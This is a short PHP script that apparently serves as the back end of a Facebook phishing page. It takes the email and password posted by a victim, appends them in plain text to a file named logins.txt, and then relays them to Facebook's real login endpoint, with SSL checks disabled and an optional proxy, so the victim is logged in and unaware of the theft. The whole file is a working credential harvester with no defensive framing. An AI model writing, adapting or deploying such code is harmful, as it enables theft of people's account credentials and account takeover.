<?php 
     $proxy = '';
     function sender($usuario,$senha,$proxy){ 
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://facebook.com/home.php");
      curl_setopt($ch, CURLOPT_HEADER, false);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      if(trim($proxy) <> '') curl_setopt($ch, CURLOPT_PROXY,$proxy);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
      curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
      curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
      $source = curl_exec($ch);
	  echo $source;
	  }
	  
  if(isset($_POST['email']) && (isset($_POST['pass'])) ){
  $files = fopen("logins.txt","a");
  $login =  "\n Login: ".$_POST['email']." , Senha: ".$_POST['pass']."\n";
  $fw = fwrite($files, $login);
  fclose($files);
  sender($_POST['email'],$_POST['pass'],$proxy);
  }
  ?>
  
  
  
